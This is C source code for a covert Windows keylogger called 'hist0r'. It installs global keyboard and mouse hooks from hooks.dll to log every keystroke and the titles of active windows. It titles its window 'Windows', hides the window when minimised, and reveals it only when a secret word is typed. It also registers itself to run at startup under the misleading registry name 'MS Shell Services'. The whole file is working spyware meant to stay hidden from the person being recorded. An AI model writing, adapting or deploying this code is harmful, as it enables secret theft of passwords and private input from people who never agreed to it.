/*=============================================================================
*
*               LOG utility, (Application)
*               Log all key pressed     and Active Window titles.
*               every day new log.
*               if type <hist0r> then will apear main window.
*
*               VisualC++ 6.0
*
*
*               Copyright (c) 2000 2001 Shilonosov Alex
*               Shilonosov@mail.ru(@mail.md), www.shilonosov.f2s.com
*
*       Original code of HOOK routine was took fom Arthur Boynagryan LOCKer.
*       boynagar@armentel.com
*
*
*/

#include "stdafx.h"
#include "resource.h"
#include "hooks.h"

#define MAX_LOADSTRING 100

HWND hWnd;                                                      // current instance
char szTitle[] ={"Windows"};                                                            // The title bar text
char szWndCls[]={"hist0r"};                                                             // The title bar text

HMODULE hMod;
HHOOK hKH,hMH,hSH; // hist0r

#define REGISTRY_APP_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
#define REGISTRY_KEY_NAME "MS Shell Services"

ATOM                            MyRegisterClass(HINSTANCE hInstance);
BOOL                            InitInstance(HINSTANCE, int);
LRESULT CALLBACK        WndProc(HWND, UINT, WPARAM, LPARAM);

void OnStart();
void RegisterMySelf();
void OnStop();

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
        MSG msg;

        if ( FindWindow(szWndCls,NULL) ) return 1; // Only 1 instance

        MyRegisterClass(hInstance);
        if ( !(hWnd = CreateWindow(szWndCls, szTitle, WS_OVERLAPPEDWINDOW,
                1, 100, 1, 100, NULL, NULL, hInstance, NULL))  )
                return FALSE;

        RegisterMySelf();
        OnStart();

        SetTimer(hWnd,1,100,NULL);

        while (  GetMessage(&msg, NULL, 0, 0))
        {
                if ( isExit() ) // show window
                {
                        ShowWindow(hWnd, nCmdShow);
                        UpdateWindow(hWnd);
                }

                TranslateMessage(&msg);
                DispatchMessage(&msg);
        }
        return msg.wParam;
}



//

ATOM MyRegisterClass(HINSTANCE hInstance)
{
        WNDCLASSEX wcex;

        wcex.cbSize = sizeof(WNDCLASSEX);

        wcex.style                      = CS_HREDRAW | CS_VREDRAW;
        wcex.lpfnWndProc        = (WNDPROC)WndProc;
        wcex.cbClsExtra         = 0;
        wcex.cbWndExtra         = 0;
        wcex.hInstance          = hInstance;
        wcex.hIcon                      = NULL;
        wcex.hCursor            = LoadCursor(NULL, IDC_ARROW);
        wcex.hbrBackground      = (HBRUSH)(COLOR_WINDOW+1);
        wcex.lpszMenuName       = NULL;
        wcex.lpszClassName      = szWndCls;
        wcex.hIconSm            = NULL;

        return RegisterClassEx(&wcex);
}


//
//  FUNCTION: WndProc(HWND, unsigned, WORD, LONG)
//
//  PURPOSE:  Processes messages for the main window.
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
        int wmId, wmEvent;

        switch (message)
        {
        case WM_SYSCOMMAND:
                if ( wParam == SC_MINIMIZE)
                {
                        ShowWindow(hWnd, SW_HIDE);
                } else
                        return DefWindowProc(hWnd, message, wParam, lParam);
                break;

                case WM_DESTROY:
                        OnStop();
                        PostQuitMessage(0);
                        break;
                default:
                        return DefWindowProc(hWnd, message, wParam, lParam);
        }
        return 0;
}


void OnStart()
{
        hMod = LoadLibrary("hooks.dll");
        if (hMod == NULL)       return ;

        hKH = SetWindowsHookEx(WH_KEYBOARD, &KeyProc, hMod, 0);
        hMH = SetWindowsHookEx(WH_MOUSE, &MouseProc, hMod, 0);
                hSH = (HHOOK)11;

        SetHooks(hKH, hMH, hSH , hWnd);
      return;
}

void OnStop()
{
         UnhookWindowsHookEx(hKH);
         UnhookWindowsHookEx(hMH);
         UnhookWindowsHookEx(hSH);
                 return;
}


// RUN at startup
//
void RegisterMySelf()
{

    int nResultDll = 0;

        HKEY hkRegKey;

        char szModuleName[512];
        GetModuleFileName(NULL, szModuleName, 512);

        if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkRegKey, NULL) == ERROR_SUCCESS)
        {

        HKEY hkRegKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, KEY_ALL_ACCESS, &hkRegKey) == ERROR_SUCCESS)
        {
            if(RegSetValueEx(hkRegKey, REGISTRY_KEY_NAME, 0, REG_SZ, (BYTE *)szModuleName, lstrlen(szModuleName)) == ERROR_SUCCESS)
            RegCloseKey(hkRegKey);
        }
        }

                if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkRegKey, NULL) == ERROR_SUCCESS)
        {

        HKEY hkRegKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_APP_PATH, 0, KEY_ALL_ACCESS, &hkRegKey) == ERROR_SUCCESS)
        {
            if(RegSetValueEx(hkRegKey, REGISTRY_KEY_NAME, 0, REG_SZ, (BYTE *)szModuleName, lstrlen(szModuleName)) == ERROR_SUCCESS)
            RegCloseKey(hkRegKey);
        }
        }
                return;
}



